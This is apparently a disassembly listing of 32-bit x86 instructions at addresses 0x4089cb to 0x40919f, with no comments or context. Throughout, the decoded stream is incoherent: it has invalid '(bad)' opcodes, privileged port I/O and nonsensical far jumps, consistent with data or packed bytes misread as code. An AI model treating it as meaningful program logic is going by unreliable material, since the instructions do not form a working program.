  4089cb:	add    al,0xd8
  4089cd:	xchg   ebx,eax
  4089ce:	mov    eax,ds:0x9751499e
  4089d3:	jae    0x408978
  4089d5:	add    eax,0xe2a5ae35
  4089da:	aaa    
  4089db:	add    cl,BYTE PTR [edi+0x357d2688]
  4089e1:	lock imul ebp,DWORD PTR [ecx-0x5daf8e30],0x9e987f11
  4089ec:	ja     0x4089dc
  4089ee:	inc    eax
  4089ef:	add    DWORD PTR [ebx-0x3fedbab7],ebp
  4089f5:	mov    bl,ah
  4089f7:	div    dh
  4089f9:	push   ebx
  4089fa:	mov    esp,0xe3214437
  4089ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a00:	cmp    ebx,DWORD PTR [ebx-0x22ec27f7]
  408a06:	push   0xffffffcc
  408a08:	gs adc ecx,edi
  408a0b:	loope  0x4089e9
  408a0d:	mov    bl,0xd0
  408a0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a10:	stos   BYTE PTR es:[edi],al
  408a11:	in     al,dx
  408a12:	and    DWORD PTR [eax],edi
  408a14:	cmp    DWORD PTR [edx+eax*2],ebp
  408a17:	xchg   BYTE PTR [esi-0x3a],al
  408a1a:	mov    bh,0xe9
  408a1c:	push   eax
  408a1d:	stc    
  408a1e:	cs out dx,eax
  408a20:	push   esi
  408a21:	pop    edi
  408a22:	idiv   BYTE PTR [edi-0x7660760c]
  408a28:	sbb    DWORD PTR [edx-0x3fc65c8c],edi
  408a2e:	xchg   ebx,eax
  408a2f:	xchg   DWORD PTR [edx-0x51],esp
  408a32:	jp     0x4089c2
  408a34:	mov    bh,BYTE PTR [ecx-0x29]
  408a37:	push   esp
  408a38:	outs   dx,BYTE PTR ds:[esi]
  408a39:	bound  esp,QWORD PTR [ebp+0x24c48d45]
  408a3f:	cwde   
  408a40:	shr    BYTE PTR [ecx+0x5027c42e],cl
  408a46:	xchg   ebp,eax
  408a47:	ins    DWORD PTR es:[edi],dx
  408a48:	(bad)  
  408a4a:	push   edi
  408a4b:	mov    ebx,0x13297737
  408a50:	shl    DWORD PTR [eax+0x5dca9d67],0x52
  408a57:	les    edx,FWORD PTR [ecx+0xd]
  408a5a:	adc    ebp,DWORD PTR [edi+0x4a]
  408a5d:	in     al,0x82
  408a5f:	imul   esi,DWORD PTR [edi],0x157f2fb5
  408a65:	adc    dl,dh
  408a67:	call   0x600033e9
  408a6c:	lock out dx,al
  408a6e:	imul   esp,DWORD PTR [ebp-0x4c],0x72eb9f8f
  408a75:	cmp    eax,0x65f8e575
  408a7a:	retf   0x36e4
  408a7d:	div    DWORD PTR [ecx+0xfcad46]
  408a83:	ins    BYTE PTR es:[di],dx
  408a85:	nop
  408a86:	call   0x159605a8
  408a8b:	sbb    al,0x22
  408a8d:	sahf   
  408a8e:	pusha  
  408a8f:	mov    al,0x42
  408a91:	mov    eax,DWORD PTR [eax+0x31]
  408a94:	loopne 0x408a2e
  408a96:	mov    ch,0xa2
  408a98:	sbb    DWORD PTR [ecx],0x22
  408a9b:	push   es
  408a9c:	ins    DWORD PTR es:[edi],dx
  408a9d:	mov    ebp,0xb154f08c
  408aa2:	push   edx
  408aa3:	sub    eax,0xb82dec9b
  408aa8:	mov    bh,0x79
  408aaa:	xor    al,ah
  408aac:	push   edx
  408aad:	xor    BYTE PTR [ebp-0x3cd31c79],dh
  408ab3:	iret   
  408ab4:	lods   al,BYTE PTR ds:[esi]
  408ab5:	sub    eax,0xa8f517d
  408aba:	popa   
  408abb:	gs push edi
  408abd:	cmp    cl,BYTE PTR [edx]
  408abf:	idiv   BYTE PTR [edx+0x735397bc]
  408ac5:	xchg   DWORD PTR ds:0x8ff87d8c,ebx
  408acb:	inc    esp
  408acc:	cmp    dh,BYTE PTR [eax]
  408ace:	ret    
  408acf:	repz fldcw WORD PTR [edx]
  408ad2:	call   0x8b8b:0x1c43121a
  408ad9:	adc    bh,ah
  408adb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408adc:	retf   0x7279
  408adf:	dec    ebp
  408ae0:	cmc    
  408ae1:	jg     0x408aa1
  408ae3:	mov    bh,0x4
  408ae5:	cmp    al,0x80
  408ae7:	retf   0x4393
  408aea:	push   edi
  408aeb:	sar    edi,cl
  408aed:	mov    ebp,0x73827f29
  408af2:	mov    ch,0x4b
  408af4:	xchg   esp,eax
  408af5:	inc    esp
  408af6:	(bad)  
  408af7:	mov    ah,0x26
  408af9:	xchg   edi,eax
  408afa:	sbb    al,0x80
  408afc:	mov    cl,0x84
  408afe:	cld    
  408aff:	imul   eax,DWORD PTR [edi],0xffffff9d
  408b02:	xchg   ecx,eax
  408b03:	nop
  408b04:	mov    bl,BYTE PTR [ecx]
  408b06:	inc    esp
  408b07:	sub    bh,BYTE PTR [eax+esi*2]
  408b0a:	adc    al,0xa4
  408b0c:	mov    ebp,0xefa8d844
  408b11:	ficom  WORD PTR [ecx]
  408b13:	push   ebp
  408b14:	cld    
  408b15:	pop    ebp
  408b16:	cmp    al,0x8f
  408b18:	out    dx,eax
  408b19:	and    ecx,esi
  408b1b:	mov    edi,eax
  408b1d:	int3   
  408b1e:	leave  
  408b1f:	xchg   ebp,eax
  408b20:	lods   al,BYTE PTR ds:[esi]
  408b21:	cmp    esp,DWORD PTR [edx-0x40175c0b]
  408b27:	push   ebx
  408b28:	inc    ebp
  408b29:	fcomp  DWORD PTR [ebp+0x38]
  408b2c:	push   0xacc5d14e
  408b31:	adc    eax,0x72088bb1
  408b36:	shl    DWORD PTR [edi],cl
  408b38:	adc    bl,ch
  408b3a:	push   esi
  408b3b:	ret    
  408b3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b3d:	push   0x6f
  408b3f:	cmc    
  408b40:	popf   
  408b41:	lea    eax,[ebx+0x6c]
  408b44:	mov    ah,0x81
  408b46:	shl    DWORD PTR [edi+ecx*2+0x4df251b9],1
  408b4d:	int    0xe5
  408b4f:	and    bl,BYTE PTR [ecx+0x104d6cc1]
  408b55:	pop    ss
  408b56:	arpl   WORD PTR [edi+0x1bd894e1],cx
  408b5c:	dec    eax
  408b5d:	ret    0x3d7c
  408b60:	bound  ecx,QWORD PTR [edx+0x76]
  408b63:	jecxz  0x408b77
  408b65:	jle    0x408b3b
  408b67:	gs daa 
  408b69:	popf   
  408b6a:	inc    ebp
  408b6b:	lock cmp al,0x71
  408b6e:	je     0x408baa
  408b70:	scas   al,BYTE PTR es:[edi]
  408b71:	jo     0x408be6
  408b73:	in     al,0xbf
  408b75:	xor    esp,DWORD PTR [eax+esi*1]
  408b78:	gs ds jnp 0x408bf9
  408b7c:	cs repz es pop eax
  408b80:	(bad)  
  408b81:	js     0x408b3b
  408b83:	adc    DWORD PTR [edx+0x11dd242e],0x7a
  408b8a:	cmp    eax,0x2cc59f54
  408b8f:	dec    edi
  408b90:	dec    edi
  408b91:	xchg   esi,eax
  408b92:	test   BYTE PTR [edx+ebp*8],bl
  408b95:	xor    ch,0x6b
  408b98:	test   eax,0xb83a4b15
  408b9d:	or     BYTE PTR [ebp+eiz*1+0x70],al
  408ba1:	xor    esi,esi
  408ba3:	addr16 call 0x719a2abb
  408ba9:	sahf   
  408baa:	jns    0x408c19
  408bac:	or     DWORD PTR [edi+0x2686bcd7],0x908b2ab7
  408bb6:	cmp    al,0xbe
  408bb8:	sahf   
  408bb9:	es nop
  408bbb:	sub    al,0x23
  408bbd:	inc    ecx
  408bbe:	push   0x7e57388e
  408bc3:	jle    0x408b4e
  408bc5:	popa   
  408bc6:	test   DWORD PTR [ebx+0x3a2bdc7f],edi
  408bcc:	dec    ebx
  408bcd:	fidivr DWORD PTR [ebx+0x4166e093]
  408bd3:	dec    eax
  408bd4:	sub    dl,BYTE PTR [edx]
  408bd6:	out    dx,eax
  408bd7:	lock lea ecx,[ecx]
  408bda:	jno    0x408c41
  408bdc:	cmp    bl,al
  408bde:	fsub   st(2),st
  408be0:	push   edi
  408be1:	xor    eax,0x1f120c1c
  408be6:	test   ebx,ecx
  408be8:	stc    
  408be9:	inc    esp
  408bea:	or     eax,0x4d6e2a56
  408bef:	and    ebp,DWORD PTR [esi+eax*1]
  408bf2:	test   eax,0x3629de34
  408bf7:	add    BYTE PTR [ecx+0x15b34611],ah
  408bfd:	gs loopne 0x408bd4
  408c00:	in     al,0x8d
  408c02:	bound  esp,QWORD PTR [edi]
  408c04:	xor    dl,BYTE PTR [edi-0x25]
  408c07:	push   esi
  408c08:	cld    
  408c09:	gs jo  0x408c01
  408c0c:	and    al,0x91
  408c0e:	mov    edx,0x971eed6f
  408c13:	(bad)  
  408c14:	sub    esi,DWORD PTR [eax+0x34563104]
  408c1a:	shl    BYTE PTR [edx-0x596c361d],1
  408c20:	iret   
  408c21:	fwait
  408c22:	popa   
  408c23:	adc    al,0xaf
  408c25:	ins    BYTE PTR es:[edi],dx
  408c26:	and    ebx,DWORD PTR [ecx-0x5a]
  408c29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408c2a:	cmp    al,0xfc
  408c2c:	mov    dl,BYTE PTR [edi-0x69]
  408c2f:	retf   
  408c30:	mov    ch,0xc2
  408c32:	data16 fidivr WORD PTR [ebp+0x6f]
  408c36:	mov    ebx,0xe78c75c1
  408c3b:	out    0x38,eax
  408c3d:	mov    edi,esp
  408c3f:	int3   
  408c40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408c41:	nop
  408c42:	mov    eax,DWORD PTR es:[ebp-0x20]
  408c46:	mov    edx,DWORD PTR [ebp-0x8]
  408c49:	mov    edi,DWORD PTR [ebp-0x24]
  408c4c:	xor    edx,ecx
  408c4e:	jmp    0x408fc4
  408c53:	inc    esp
  408c54:	pusha  
  408c55:	sub    BYTE PTR [esi],bh
  408c57:	sub    BYTE PTR [esi+0x72],dl
  408c5a:	(bad)
  408c5f:	dec    ebp
  408c60:	adc    eax,0xe46ca7ee
  408c65:	jl     0x408ce3
  408c67:	xlat   BYTE PTR ds:[ebx]
  408c68:	jns    0x408ce6
  408c6a:	jl     0x408bf5
  408c6c:	mov    BYTE PTR [edi-0x41],al
  408c6f:	ins    DWORD PTR es:[edi],dx
  408c70:	jne    0x408ca1
  408c72:	inc    ecx
  408c73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408c74:	cdq    
  408c75:	out    dx,eax
  408c76:	ret    
  408c77:	retf   0x7794
  408c7a:	or     esp,ebp
  408c7c:	jb     0x408c0e
  408c7e:	iret   
  408c7f:	xchg   ebp,eax
  408c80:	pop    esp
  408c81:	(bad)  [esi]
  408c83:	call   0x6642:0xe1167d93
  408c8a:	fnstcw WORD PTR [edi-0x6a]
  408c8d:	frstor [edx+0x77]
  408c90:	in     eax,0xe2
  408c92:	add    BYTE PTR ds:0x21799433,cl
  408c98:	push   ebx
  408c99:	outs   dx,BYTE PTR ds:[esi]
  408c9a:	pop    ecx
  408c9b:	or     esp,DWORD PTR [ecx+edi*1]
  408c9e:	and    ebp,DWORD PTR [esi+0x124e3968]
  408ca4:	pop    esi
  408ca5:	ret    
  408ca6:	enter  0x7d71,0x2b
  408caa:	or     al,0xc4
  408cac:	dec    ecx
  408cad:	mul    DWORD PTR [ecx+0x6593dfab]
  408cb3:	or     al,0xcd
  408cb5:	imul   esi,ebx,0x3b6aa758
  408cbb:	sub    eax,0x2c0a3695
  408cc0:	mov    ch,0x1f
  408cc2:	cmp    al,0xc2
  408cc4:	imul   esi,DWORD PTR ss:[ecx+0x217ace8f],0x8465961f
  408ccf:	out    dx,eax
  408cd0:	enter  0x226d,0x35
  408cd4:	push   cs
  408cd5:	mov    esp,0xb7ec38d4
  408cda:	push   es
  408cdb:	pop    edi
  408cdc:	shl    al,1
  408cde:	pushf  
  408cdf:	shr    BYTE PTR [eax-0x7f],1
  408ce2:	push   ebx
  408ce3:	or     BYTE PTR [edi],cl
  408ce5:	sub    BYTE PTR [ebp+0x2e35b4df],bl
  408ceb:	test   ebp,0xa4f90fb3
  408cf1:	xlat   BYTE PTR ds:[ebx]
  408cf2:	(bad)  
  408cf3:	mov    DWORD PTR [ebp+0x5],ecx
  408cf6:	jo     0x408d0e
  408cf8:	lea    edi,ss:[eax-0x75]
  408cfc:	jnp    0x408cb3
  408cfe:	popa   
  408cff:	ret    
  408d00:	dec    ebp
  408d01:	cmp    al,0x80
  408d03:	adc    eax,0xe67a8e86
  408d08:	lods   eax,DWORD PTR ds:[esi]
  408d09:	loope  0x408d37
  408d0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408d0c:	stos   DWORD PTR es:[edi],eax
  408d0d:	jbe    0x408d82
  408d0f:	icebp  
  408d10:	and    eax,0x977d5cce
  408d15:	cmp    BYTE PTR [ebx],0x48
  408d18:	pop    esi
  408d19:	(bad)  [ecx+0x17b300cb]
  408d1f:	cmp    DWORD PTR [eax+0x6bcc0029],ebx
  408d25:	jmp    0x408cf2
  408d27:	fcomp  DWORD PTR [ebx-0x7251b217]
  408d2d:	lock pop edx
  408d2f:	add    DWORD PTR [eax+edx*2+0x5f],0xf8962921
  408d37:	mov    es:0xa055da3f,eax
  408d3d:	sub    eax,edi
  408d3f:	add    DWORD PTR ds:0x439f10a5,ecx
  408d45:	mov    DWORD PTR [esi-0x3f412153],edx
  408d4b:	fist   DWORD PTR [ebp+0x6c]
  408d4e:	dec    ebp
  408d4f:	(bad)  
  408d50:	popf   
  408d51:	daa    
  408d52:	jbe    0x408d28
  408d54:	retf   
  408d55:	push   esp
  408d56:	dec    esp
  408d57:	push   es
  408d58:	pop    esi
  408d59:	popf   
  408d5a:	inc    esp
  408d5b:	push   esi
  408d5c:	adc    edx,DWORD PTR [ecx]
  408d5e:	mov    al,ds:0x8d2f63c0
  408d63:	xchg   bl,dl
  408d65:	je     0x408d9f
  408d67:	jge    0x408da2
  408d69:	out    0x7a,eax
  408d6b:	and    eax,0xb57529a5
  408d70:	and    DWORD PTR [ebx+0xd],eax
  408d73:	je     0x408d64
  408d75:	stos   DWORD PTR es:[edi],eax
  408d76:	pop    ss
  408d77:	rdmsr  
  408d79:	mov    cl,0x31
  408d7b:	xchg   esi,eax
  408d7c:	fcom   DWORD PTR [esi]
  408d7e:	pop    edi
  408d7f:	outs   dx,DWORD PTR ds:[esi]
  408d80:	fild   WORD PTR [edx]
  408d82:	jp     0x408dc7
  408d84:	and    BYTE PTR [ebx+0x76],ch
  408d87:	(bad)  
  408d88:	xor    DWORD PTR [ebx+0x50],esi
  408d8b:	clc    
  408d8c:	rol    DWORD PTR [ecx+0x4ec34d16],1
  408d92:	and    al,0xf1
  408d94:	cld    
  408d95:	sub    esi,DWORD PTR [ecx]
  408d97:	mov    cs,WORD PTR [eax-0x2d64957]
  408d9d:	mov    ch,0x17
  408d9f:	pop    ss
  408da0:	outs   dx,BYTE PTR ds:[esi]
  408da1:	xchg   edi,eax
  408da2:	xor    BYTE PTR [ebx],al
  408da4:	push   ss
  408da5:	mov    WORD PTR [ecx+0x67122128],es
  408dab:	adc    bh,ah
  408dad:	loopne 0x408dd5
  408daf:	push   edx
  408db0:	dec    edi
  408db1:	mov    esi,0x9fec23b2
  408db6:	dec    eax
  408db7:	ins    BYTE PTR es:[edi],dx
  408db8:	mov    esp,0xb20ba0a5
  408dbd:	and    al,BYTE PTR [esi]
  408dbf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408dc0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408dc1:	cmp    eax,0xa47c77ba
  408dc6:	mov    ebp,ds
  408dc8:	mov    eax,ds:0xb6c9da74
  408dcd:	pop    edi
  408dce:	aaa    
  408dcf:	adc    BYTE PTR ds:0xfe0ff02e,al
  408dd5:	jecxz  0x408dcc
  408dd7:	mov    edi,DWORD PTR [ebp-0x2379f0a4]
  408ddd:	push   cs
  408dde:	or     BYTE PTR [ecx-0x6b3253b9],ch
  408de4:	lods   al,BYTE PTR ds:[esi]
  408de5:	loope  0x408e26
  408de7:	mov    ds:0xdadeb666,eax
  408dec:	imul   edx,edx,0x68
  408def:	xor    esp,esi
  408df1:	cwde   
  408df2:	cdq    
  408df3:	xchg   edi,edx
  408df5:	int    0x7c
  408df7:	(bad)  
  408df8:	repz xor BYTE PTR [ecx],dl
  408dfb:	mov    dl,0x7b
  408dfd:	dec    esi
  408dfe:	jo     0x408d97
  408e00:	sub    eax,0x244a4cc0
  408e05:	xchg   BYTE PTR [edi+edx*2-0x60c5459c],dl
  408e0c:	rol    DWORD PTR [edi+0x7f],cl
  408e0f:	xor    BYTE PTR [ecx-0x451c4ff4],ch
  408e15:	mov    esp,0x456c6925
  408e1a:	push   ecx
  408e1b:	sahf   
  408e1c:	xchg   esp,eax
  408e1d:	jl     0x408e72
  408e1f:	jp     0x408e1c
  408e21:	pop    ebx
  408e22:	out    dx,al
  408e23:	cmp    eax,0x4d653e08
  408e28:	or     BYTE PTR [edx+0x69bdc993],al
  408e2e:	fiadd  WORD PTR [edx+0x14]
  408e31:	lock sahf 
  408e33:	jmp    0x408e60
  408e35:	out    0x4c,al
  408e37:	jb     0x408e19
  408e39:	mov    ds:0x2ac21984,al
  408e3e:	jbe    0x408dfe
  408e40:	sub    eax,0x86d97015
  408e45:	mov    al,BYTE PTR [ecx]
  408e47:	cld    
  408e48:	mov    cl,BYTE PTR [ebp+0x419f6073]
  408e4e:	jo     0x408e19
  408e50:	out    0xb7,eax
  408e52:	ret    0xbf60
  408e55:	xchg   ebp,eax
  408e56:	mov    ecx,0xb3819320
  408e5b:	ins    BYTE PTR es:[edi],dx
  408e5c:	aaa    
  408e5d:	and    BYTE PTR [ebp-0x20],bh
  408e60:	jnp    0x408ea4
  408e62:	push   ebx
  408e63:	fidiv  WORD PTR ds:0xec0b3090
  408e69:	inc    eax
  408e6a:	ds sub al,0x6c
  408e6d:	xchg   esi,eax
  408e6e:	(bad)  
  408e6f:	repz das 
  408e71:	sub    eax,0xe6a317da
  408e76:	jne    0x408ef5
  408e78:	test   eax,0x35cdeed5
  408e7d:	dec    esp
  408e7e:	mov    ds:0x45f56823,al
  408e83:	popa   
  408e84:	sbb    BYTE PTR [ecx+eax*8],dh
  408e87:	mov    dl,0x98
  408e89:	js     0x408ed5
  408e8b:	pop    ebp
  408e8c:	loope  0x408ef5
  408e8e:	and    bl,BYTE PTR [ecx+0x68f38c42]
  408e94:	dec    edi
  408e95:	fnstenv [ebx+0x15]
  408e98:	cmp    edi,esi
  408e9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408e9b:	cld    
  408e9c:	repnz xor esi,DWORD PTR [ebx-0x3b5f7674]
  408ea3:	jmp    0x408e8b
  408ea5:	mov    eax,0x4c910c2d
  408eaa:	das    
  408eab:	dec    ebp
  408eac:	jge    0x408eb9
  408eae:	or     DWORD PTR [eax-0x7f],0x4d
  408eb2:	cli    
  408eb3:	inc    ecx
  408eb4:	cmc    
  408eb5:	cmp    DWORD PTR [esi-0x410c3ae8],esp
  408ebb:	test   eax,0x5794a13e
  408ec0:	mov    dh,0xa7
  408ec2:	iret   
  408ec3:	mov    edx,0x6bb9f0a5
  408ec8:	dec    ebx
  408ec9:	cmp    ah,BYTE PTR [esi*8-0x77865106]
  408ed0:	xchg   ecx,eax
  408ed1:	xchg   edi,eax
  408ed2:	stos   BYTE PTR es:[edi],al
  408ed3:	fsincos 
  408ed5:	shr    esp,cl
  408ed7:	xor    ebp,esp
  408ed9:	gs cdq 
  408edb:	mov    ebp,0xaba161b3
  408ee0:	mov    esp,0x316289fd
  408ee5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ee6:	iret   
  408ee7:	test   BYTE PTR [edx-0x4a],bh
  408eea:	xor    cl,ah
  408eec:	ins    BYTE PTR es:[edi],dx
  408eed:	jo     0x408f0d
  408eef:	adc    eax,0x69364eca
  408ef4:	scas   al,BYTE PTR es:[edi]
  408ef5:	int    0x14
  408ef7:	hlt    
  408ef8:	cmp    dh,BYTE PTR ds:0x4994bddb
  408efe:	inc    esi
  408eff:	(bad)  
  408f00:	not    DWORD PTR [edx]
  408f02:	in     al,0xee
  408f04:	jne    0x408e9f
  408f06:	dec    esp
  408f07:	popf   
  408f08:	test   eax,0x2154c0c7
  408f0d:	push   ds
  408f0e:	pop    ebp
  408f0f:	jo     0x408ee4
  408f11:	adc    BYTE PTR [ebx+ebx*2+0x7b],al
  408f15:	cdq    
  408f16:	dec    ebx
  408f17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408f18:	mov    ebx,0xdc3922e8
  408f1d:	(bad)  
  408f1e:	xor    al,0xb3
  408f20:	fdiv   DWORD PTR [ebp-0x5e]
  408f23:	fwait
  408f24:	fwait
  408f25:	test   BYTE PTR [edi],dh
  408f27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f28:	adc    ebx,ebp
  408f2a:	sar    DWORD PTR ds:0x9c757642,1
  408f30:	(bad)  
  408f31:	sbb    cl,BYTE PTR fs:[ecx+0x17]
  408f35:	in     al,dx
  408f36:	dec    esp
  408f37:	mov    ?,WORD PTR [eax-0x45]
  408f3a:	sub    BYTE PTR [ebp+0x68ea4d74],dl
  408f40:	cmp    edi,DWORD PTR [edi-0x327bb4fd]
  408f46:	idiv   DWORD PTR [ebp+0x7b275fe7]
  408f4c:	mul    DWORD PTR [ebp-0x37145919]
  408f52:	data16 outs dx,BYTE PTR ds:[esi]
  408f54:	jl     0x408ee2
  408f56:	mov    esp,0x454b40b0
  408f5b:	bound  esp,QWORD PTR [ebp-0x58]
  408f5e:	xchg   edx,eax
  408f5f:	mov    ebx,0x16a7752a
  408f64:	call   0x17c71f58
  408f69:	fwait
  408f6a:	and    DWORD PTR [eax+0x268b7d94],esp
  408f70:	fs jle 0x408f21
  408f73:	ja     0x408faf
  408f75:	pop    ebx
  408f76:	test   DWORD PTR ds:0xa6c5bc1a,ebp
  408f7c:	mov    bl,0xf8
  408f7e:	iret   
  408f7f:	inc    ebx
  408f80:	jge    0x1ebbb243
  408f86:	jnp    0x408fa1
  408f88:	push   esi
  408f89:	hlt    
  408f8a:	dec    edx
  408f8b:	mov    esi,0xe1e7aedf
  408f90:	push   cs
  408f91:	or     edi,DWORD PTR [eax-0x21]
  408f94:	or     al,0xfd
  408f96:	jmp    0xf557:0x2a85b1ca
  408f9d:	mov    al,ds:0xf6d1b51d
  408fa2:	dec    esi
  408fa3:	lods   eax,DWORD PTR ds:[esi]
  408fa4:	or     BYTE PTR [eax+eiz*8],dh
  408fa7:	push   0x4e176e06
  408fac:	shr    cl,cl
  408fae:	inc    esp
  408faf:	setg   BYTE PTR [esi-0x3d]
  408fb3:	gs sbb al,0xd8
  408fb6:	loop   0x408f52
  408fb8:	dec    esp
  408fb9:	xchg   BYTE PTR [ebx+0x4e],dl
  408fbc:	sbb    DWORD PTR [esi+0x7a],edx
  408fbf:	lea    esi,[ebx+0x31c654c]
  408fc5:	(bad)  
  408fc6:	imul   edx,edi
  408fc9:	sub    DWORD PTR [eax],edx
  408fcb:	jmp    0x409341
  408fd0:	or     eax,0x738240b6
  408fd5:	jb     0x408fa4
  408fd7:	mov    cl,0xfd
  408fd9:	push   eax
  408fda:	sbb    DWORD PTR [esp+ecx*8+0x6a],ebp
  408fde:	mov    cl,0x1f
  408fe0:	(bad)  
  408fe1:	loopne 0x40905f
  408fe3:	jl     0x408fbc
  408fe5:	jns    0x409063
  408fe7:	jl     0x408fe8
  408fe9:	mov    esp,0x3ea10b6b
  408fee:	inc    eax
  408fef:	push   es
  408ff0:	xor    al,0x47
  408ff2:	popf   
  408ff3:	sbb    DWORD PTR [edi-0x39],esi
  408ff6:	jo     0x409035
  408ff8:	adc    ebp,esi
  408ffa:	dec    ebp
  408ffb:	gs mov cl,0x39
  408ffe:	mov    bl,0x31
  409000:	inc    edi
  409001:	jnp    0x408f97
  409003:	jg     0x409033
  409005:	fidivr WORD PTR ds:[esi-0xe279ca7]
  40900c:	nop
  40900d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40900e:	(bad)  
  40900f:	push   0xffffffdf
  409011:	leave  
  409012:	in     al,0xd2
  409014:	jg     0x409060
  409016:	and    al,0xd5
  409018:	add    ebx,DWORD PTR ds:0x391e1662
  40901e:	push   edx
  40901f:	bound  eax,QWORD PTR [ebx]
  409021:	mov    edi,0xaa704511
  409026:	jg     0x409075
  409028:	xor    ebx,DWORD PTR [eax]
  40902a:	add    edx,DWORD PTR [esp+ebp*4]
  40902d:	lods   al,BYTE PTR ds:[esi]
  40902e:	mov    edi,0x40392451
  409033:	aad    0xaf
  409035:	outs   dx,DWORD PTR ds:[esi]
  409036:	inc    edi
  409037:	scas   eax,DWORD PTR es:[edi]
  409038:	cli    
  409039:	rol    DWORD PTR [esi-0x6603f514],1
  40903f:	into   
  409040:	and    cl,BYTE PTR [ebp+0x3e]
  409043:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409044:	mov    eax,ds:0xe5bfd454
  409049:	test   eax,0x23eb5a46
  40904e:	fmul   DWORD PTR [eax-0x267c6e9]
  409054:	add    BYTE PTR [eax],ah
  409056:	mov    eax,0xc119d3c9
  40905b:	je     0x4090cf
  40905d:	xchg   ebp,eax
  40905e:	pop    ebp
  409060:	aad    0x5b
  409062:	mov    DWORD PTR [eax-0x29],ebp
  409065:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409066:	in     al,dx
  409067:	add    DWORD PTR [ecx-0x1b515d97],ebp
  40906d:	sahf   
  40906e:	sub    BYTE PTR [edx-0xab24c4c],dh
  409074:	in     al,0xc8
  409076:	add    eax,ebx
  409078:	aam    0xfc
  40907a:	jmp    0x1af2:0xee1fd7f3
  409081:	and    ebp,DWORD PTR ds:0xf542e80
  409087:	inc    ebp
  409088:	int3   
  409089:	js     0x409010
  40908b:	mov    eax,DWORD PTR cs:[ebx+0x77]
  40908f:	mov    esi,0xb28f54e0
  409094:	add    dh,BYTE PTR [ecx+0x42]
  409097:	cmp    dh,BYTE PTR [ebx]
  409099:	test   DWORD PTR [edx],edx
  40909b:	push   ebp
  40909c:	inc    edi
  40909d:	sub    ebp,DWORD PTR [esi-0x18c6f834]
  4090a3:	mov    ecx,DWORD PTR [ecx-0x3b3ef5cf]
  4090a9:	enter  0x7e5a,0x2c
  4090ad:	dec    ebx
  4090ae:	bound  ecx,QWORD PTR [edi+0x7df8715b]
  4090b4:	xor    al,0x3
  4090b6:	stos   DWORD PTR es:[edi],eax
  4090b7:	pop    edx
  4090b8:	iret   
  4090b9:	dec    ecx
  4090ba:	rcr    DWORD PTR [esi+0xa791e75],cl
  4090c0:	(bad)  
  4090c1:	faddp  st(3),st
  4090c3:	pslld  mm3,mm2
  4090c6:	mov    dl,0xde
  4090c8:	pop    esi
  4090c9:	(bad)  
  4090ca:	sbb    BYTE PTR [edx+0x3f969bc9],ch
  4090d0:	stos   DWORD PTR es:[edi],eax
  4090d1:	xchg   BYTE PTR [ebp+0x41b20b61],bl
  4090d7:	test   BYTE PTR [eax+0x2880bfc4],0x4b
  4090de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4090df:	push   0x5f
  4090e1:	int3   
  4090e2:	xchg   DWORD PTR [edi+0x63],ebp
  4090e5:	fprem1 
  4090e7:	test   BYTE PTR [ebp-0x5],ch
  4090ea:	call   0x62d9a2b
  4090ef:	cmp    dl,0x93
  4090f2:	loope  0x409100
  4090f4:	add    esi,DWORD PTR [esp+eax*1+0xc]
  4090f8:	pop    ebx
  4090f9:	or     al,0x89
  4090fb:	or     eax,0x4875e6fc
  409100:	(bad)  
  409102:	pop    ecx
  409103:	aam    0xcd
  409105:	cdq    
  409106:	push   ebp
  409107:	or     ebx,DWORD PTR [ebx-0x76]
  40910a:	aas    
  40910b:	and    esi,DWORD PTR [eax]
  40910d:	sub    edx,esp
  40910f:	jb     0x409123
  409111:	ja     0x409132
  409113:	ror    DWORD PTR [edx-0xa],cl
  409116:	sbb    ch,al
  409118:	adc    BYTE PTR [ebx+0x57],ch
  40911b:	scas   al,BYTE PTR es:[edi]
  40911c:	sti    
  40911d:	mov    ecx,0xc0375d95
  409122:	mov    bh,0xf8
  409124:	jge    0x409157
  409126:	and    DWORD PTR [edx],0x72
  409129:	sub    bh,al
  40912b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40912c:	pop    es
  40912d:	jecxz  0x4090fb
  40912f:	je     0x4090ba
  409131:	or     al,0xd7
  409133:	pop    ebp
  409134:	jae    0x409149
  409136:	in     al,dx
  409137:	and    DWORD PTR [eax+ebp*1-0x5b],0x766a7e16
  40913f:	(bad)  
  409140:	in     eax,0xad
  409142:	lock test ebp,0xafcb8296
  409149:	or     DWORD PTR [edi+0x73],0xdd9496ab
  409150:	sub    bh,BYTE PTR [eax+0x64]
  409153:	aas    
  409154:	jae    0x409176
  409156:	mov    edx,0x19430d3b
  40915b:	jo     0x4091ae
  40915d:	sub    al,al
  40915f:	mov    eax,ds:0xc8253d6a
  409164:	cmp    DWORD PTR [esi-0x60081039],esi
  40916a:	int    0xb
  40916c:	cmp    DWORD PTR [esi-0x5b66a53],esp
  409172:	adc    al,ah
  409174:	loop   0x4091ab
  409176:	push   ss
  409177:	mov    cl,0xd1
  409179:	mov    BYTE PTR [ebx+0x4efb6c21],al
  40917f:	pop    es
  409180:	fdivr  st,st(6)
  409182:	loope  0x4091d7
  409184:	push   0xff07a643
  409189:	cmp    esi,DWORD PTR ds:0x3b9da535
  40918f:	retf   
  409190:	pop    esi
  409191:	adc    eax,0x3f9dca56
  409196:	mov    dh,0x3e
  409198:	cs adc al,0xbb
  40919b:	stos   BYTE PTR es:[edi],al
  40919c:	dec    ebp
  40919d:	or     al,0xab
  40919f:	int3   
